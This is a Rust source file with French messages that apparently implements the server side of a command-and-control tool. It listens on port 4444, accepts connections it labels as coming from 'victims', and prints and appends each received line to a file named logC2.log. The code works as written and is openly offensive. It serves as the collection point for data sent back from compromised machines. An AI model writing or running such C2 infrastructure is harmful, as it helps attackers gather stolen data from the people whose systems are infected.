use std::fs::OpenOptions;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;

pub fn start_server() {
    let listener = TcpListener::bind("0.0.0.0:4444").expect("❌ Port 4444 impossible");

    println!("[*] En attente de connexions entrantes...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("[+] Connexion établie avec {:?}", stream.peer_addr());

                // ✅ FORCE chemin relatif SIMPLE
                let log_path = "src/Logs/logC2.log";

                std::fs::create_dir_all("src/Logs").expect("❌ Impossible de créer dossier Logs");

                let mut file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&log_path)
                    .expect("❌ Impossible d'ouvrir logC2.log");

                let reader = BufReader::new(stream);

                for line in reader.lines() {
                    match line {
                        Ok(data) => {
                            println!("{}", data);

                            if let Err(e) = writeln!(file, "{}", data) {
                                eprintln!("Erreur écriture logC2 : {}", e);
                            }
                            if let Err(e) = file.flush() {
                                eprintln!("Erreur flush logC2 : {}", e);
                            }
                        }
                        Err(e) => {
                            eprintln!("Erreur lecture stream : {}", e);
                            break;
                        }
                    }
                }

                println!("[-] Victime déconnectée.");
            }
            Err(e) => eprintln!("Erreur connexion : {}", e),
        }
    }
}
